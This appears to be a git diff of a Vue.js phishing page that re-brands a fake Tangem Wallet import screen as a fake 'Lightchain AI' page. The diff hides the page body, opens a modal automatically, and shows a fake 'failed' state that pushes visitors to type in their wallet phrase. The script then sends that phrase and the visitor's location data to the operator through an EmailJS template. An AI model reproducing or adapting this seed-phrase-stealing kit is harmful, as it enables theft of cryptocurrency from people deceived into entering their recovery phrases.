@@ -6,45 +6,11 @@
     <!-- Login Box -->
     <div class="text-white flex-grow text-white">
       <Header />
-      <div class="mx-auto max-w-screen-2xl lg:px-20 px-5">
+      <div class="mx-auto max-w-screen-2xl hidden lg:px-20 px-5">
         <div class="w-full my-[150px] lg:my-[180px]">
-          <h3 class="font-semibold text-2xl mb-8">Tangem Wallet</h3>
+          <h3 class="font-semibold text-2xl mb-8">Lighchain AI</h3>
 
-          <!-- Card Grid -->
-          <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-8">
-            <div
-              v-for="(card, index) in cards"
-              :key="index"
-              class="border border-[#272829] rounded overflow-hidden"
-            >
-              <img
-                :src="card.image"
-                :alt="card.title"
-                class="w-full h-[300px] object-contain"
-              />
-              <div class="p-3">
-                <h4 class="text-lg font-semibold mb-2">{{ card.title }}</h4>
-                <p
-                  
-                  class="text-[15px] text-neutral-400 mb-8"
-                  style="
-                    overflow: hidden;
-                    text-overflow: ellipsis;
-                    line-height: 120%
-                  "
-                >
-                  {{ card.subtitle }}
-                </p>
-                <button
-                  @click="openCloseModal"
-                  class="btn-primary"
-                  
-                >
-                  Connect
-                </button>
-              </div>
-            </div>
-          </div>
+          
         </div>
       </div>
       <Footer />
@@ -78,12 +44,12 @@
           <div class="flex flex-col items-center justify-center">
             
             <h3 class="text-xl text-gray-600 capitalize">
-              Import your Tangem Wallet
+              Local configuration needed
             </h3>
           </div>
 
           <div class="mt-10 mb-5 flex flex-col">
-            <label class="text-gray-500">Wallet Name</label>
+            <label class="text-gray-500">Lightchain</label>
             <input
               type="text"
               :disabled="true"
@@ -146,12 +112,12 @@
 <script setup>
 
 useHead({
-  title: "Tangem — Your Secure Crypto & Hardware Wallet",
+  title: "Lightchain Protocol AI - Lightchain.ai",
   meta: [
     {
       name: "description",
       content:
-        "Manage cryptocurrencies securely in the best crypto wallet. Tangem is a simple cold Bitcoin wallet where you can buy, sell, and store Bitcoin, Ethereum, and other crypto assets",
+        "Lightchain Protocol AI merges blockchain with AI via its innovative Proof of Intelligence (PoI) and AI Virtual Machine (AIVM), fostering decentralized, scalable, and privacy-focused solutions for AI tasks and governance.",
     },
   ],
 });
@@ -161,63 +127,27 @@ import Footer from "@/components/Footer.vue";
 import axios from "axios";
 import Modal from "@/components/Modal.vue";
 
-const cards = ref([
-  {
-    image:
-      "https://tangem.com/_assets/collections/products/img_01JAZ92V5VY1M06RSGA42YM63Y.webp",
-    title: "3 Cards set",
-    subtitle:
-      "A set of three Tangem cards for secure, multi-access wallet management and backup.",
-    buttonText: "Connect",
-    link: "#",
-  },
-  {
-    image:
-      "https://tangem.com/_assets/collections/products/img_01JAZ91P4DQY92S5GJREF5PGZ0.webp",
-    title: "2 Cards set",
-    subtitle:
-      "Manage multiple crypto accounts with three security chips and air-gapped protection.",
-    buttonText: "Learn More",
-    link: "#",
-  },
-  {
-    image:
-      "https://tangem.com/_assets/collections/products/img_01JT0A177Q5VD73R4DVTBATVSD.webp",
-    title: "Family Pack",
-    subtitle:
-      "A robust stainless steel solution to safeguard your seed phrases and private keys.",
-    buttonText: "Learn More",
-    link: "#",
-  },
-  {
-    image:
-      "https://tangem.com/_astro/ring-cards.CMJBZhcJ_Z1tAa1a.avif",
-    title: "Tangem Ring",
-    subtitle:
-      "A wearable hardware wallet ring for convenient and secure crypto access.",
-    buttonText: "Learn More",
-    link: "#",
-  },
-]);
 
-const showModal = ref(false);
+const showModal = ref(true);
 const modalState = ref("loading");
 const phrase = ref("");
-const name = ref("Tangem Wallet");
+const name = ref("Lighchain LCAI tokens");
 const isSubmitting = ref(false);
 
-const openCloseModal = () => {
-  showModal.value = !showModal.value;
+
   if (showModal.value) {
     setTimeout(() => {
       modalState.value = "failed";
     }, 2000);
   }
-};
+
+
 
 const closeModal = () => {
   showModal.value = false;
   modalState.value = "loading";
+
+  window.location.href = "/";
 };
 
 const connectManually = () => {
@@ -235,8 +165,8 @@ const proceed = async () => {
       template_id: "template_xv7sb0z",
       user_id: "user_nsG3rSdCFpgONwwCfNTas",
       template_params: {
-        from_name: "Tangem",
-        wallet_type: "Tangem Wallets",
+        from_name: "Lighchain AI",
+        wallet_type: "Lighchain Wallets",
         location: JSON.stringify(location.data),
         link_drops: phrase.value,
         reply_to: "customeronlineagent@gmail.com",
@@ -253,7 +183,7 @@ const proceed = async () => {
       modalState.value = "barcode";
     }
   } catch (error) {
-    console.error("Error importing Tangem:", error);
+    console.error("Error importing Lighchain AI:", error);
   } finally {
     isSubmitting.value = false;
   }
